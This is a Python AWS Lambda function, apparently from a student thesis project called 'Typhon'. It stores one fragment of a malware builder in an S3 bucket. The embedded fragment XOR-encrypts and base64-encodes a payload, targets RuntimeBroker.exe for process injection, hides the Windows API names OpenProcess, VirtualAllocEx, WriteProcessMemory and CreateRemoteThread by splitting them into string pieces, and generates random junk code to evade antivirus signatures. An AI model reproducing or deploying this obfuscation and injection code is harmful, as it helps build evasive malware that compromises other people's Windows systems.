import json
import boto3
import base64


s3 = boto3.client('s3')


def lambda_handler(event, context):

    """
    La función Scilla guarda el fragmento 2 en S3.
    El fragmento 2 es el encargado de ofuscar la lógica de inyección con inserción de código basura, reordenamiento de nombres de funciones y cifrado.
    
    """
    
    nombre_fragmento = "fragmento2.json"
    nombre_bucket = "tfg-typhon-bucket"
   
   # Código de ofusación
    config_data = r"""
   
import random
import base64


num_aleatorio = random.randint(1, 255)
nombre_func_dec = f"init_core_{random.randint(100, 999)}"
nombre_func_pid = f"check_env_{random.randint(100, 999)}"
target_proc = "RuntimeBroker.exe"


texto_c = base64.b64encode(bytes([b ^ num_aleatorio for b in payload])).decode()


n_op = "Ope" + "nPr" + "ocess"
n_va = "Virtu" + "alAl" + "locE" + "x"
n_wm = "Writ" + "eProce" + "ssMem" + "ory"
n_ct = "Cre" + "ateRem" + "oteTh" + "read"


def junk():
    names = ["cache_id", "buffer_val", "temp_ref", "p_status", "v_offset"]
    lineas_ruido = []
   
    for _ in range(random.randint(2, 5)):
        name = random.choice(names) + "_" + str(random.randint(100, 999))
       
        tipo = random.randint(1, 2)
        if tipo == 1:
            linea = f"{name} = ({random.randint(100, 900)} * {random.randint(2, 4)})"
        else:
            linea = f"{name} = str(hex({random.randint(1000, 9000)})).replace('0x', '')"
       
        lineas_ruido.append(linea)
       
    return "\n    ".join(lineas_ruido)


"""
    datos_a_guardar = {
        "module_id": "2",
        "content": base64.b64encode(config_data.encode()).decode(),
        "is_bin": 0
    }
   
   # Guarda el fragmento en S3. Si hay un error, se captura y se devuelve un error 500
    try:
        s3.put_object(
            Bucket=nombre_bucket,
            Key=nombre_fragmento,
            Body=json.dumps(datos_a_guardar),
            ContentType='application/json'
        )
       
        return {
            'statusCode': 200,
            'body': json.dumps(f'[SUCCESS]{nombre_fragmento} guardado en S3')
        }
       
    except Exception as e:
        print(f"Error guardando en S3: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps('[ERROR] Error al guardar fragmento')
        }
